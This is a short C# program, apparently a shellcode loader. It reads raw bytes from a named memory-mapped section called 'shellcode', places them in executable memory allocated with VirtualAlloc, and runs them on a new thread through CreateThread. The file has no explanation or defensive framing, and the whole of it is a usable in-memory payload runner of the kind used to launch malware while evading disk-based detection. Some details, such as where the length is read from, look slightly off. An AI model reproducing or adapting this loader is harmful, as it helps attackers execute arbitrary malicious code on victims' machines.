using System;
using System.IO.MemoryMappedFiles;
using System.Runtime.InteropServices;

class Program
{

    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(UInt64 lpAddress, UInt64 dWsize, UInt64 flAllocationType, UInt64 flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt64 lpThreadAttributes, UInt64 dWsize, IntPtr lpStartAddress, IntPtr lpParameter, UInt64 dwCreationFlags, IntPtr lpThradId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt64 dwMilliSeconds);

    private static UInt64 MEM_COMMIT = 0x1000;
    private static UInt64 PAGE_EXECUTE_READWRITE = 0x40;

    public static void ExecuteShellcode(byte[] shellcode)
    {
        IntPtr address = VirtualAlloc(0, (UInt64)(shellcode.Length - 1), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, address, shellcode.Length - 1);
        IntPtr threadHandle = CreateThread(0, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);

    }
    static void Main(string[] args)
    {

        MemoryMappedFile mmf = MemoryMappedFile.OpenExisting("shellcode");
        MemoryMappedViewAccessor accessor = mmf.CreateViewAccessor();

        int length = accessor.ReadByte(1);
        byte[] shellcode = new byte[length];

        MemoryMappedViewStream stream = mmf.CreateViewStream(0, length);
        stream.Read(shellcode, 0, length);

        ExecuteShellcode(shellcode);
    }
}
